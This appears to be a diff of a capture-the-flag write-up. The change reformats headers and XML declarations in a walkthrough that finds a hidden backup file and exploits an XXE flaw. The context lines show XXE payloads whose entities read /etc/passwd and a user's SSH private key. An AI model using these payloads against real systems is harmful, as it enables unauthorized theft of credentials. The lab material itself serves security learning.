@@ -16,12 +16,12 @@ comments: false
 ## Let's eumerate the hidden directories
 <br>
 ## Our scan shows:
-## /robots.txt and /custom
-
-## /robots.txt -> shows nothing
-
+> /robots.txt and /custom
+<br>
+> /robots.txt -> shows nothing
+<br>
 ## Enumerating /custom further we see subdirectory /js
-## /custom/js -> shows users backup file
+> /custom/js -> shows users backup file
 <br>
 ## We will use strings to read the file
 ## strings shows:
@@ -59,7 +59,7 @@ Lets go back and see what we missed...
 ## Looking at this directy path,
 ## We can see the xml format we will need to use:
 
-" <?xml version="1.0" encoding="UTF-8"?>
+< ?xml version="1.0" encoding="UTF-8"?>
 
 <comment>
   <name>10DNC</name>
@@ -75,7 +75,7 @@ Lets go back and see what we missed...
 <br>
 ## Let's modify and test the basic blind XXE vulnerability:
 
-<?xml version="1.0" encoding="UTF-8"?>
+< ?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
 <comment>
   <name>10DNC</name>
@@ -86,7 +86,7 @@ Lets go back and see what we missed...
 <br>
 ## This works, Lets now try and get barries credentials:
 
-<?xml version="1.0" encoding="UTF-8"?>
+< ?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
 <comment>
   <name>10DNC</name>
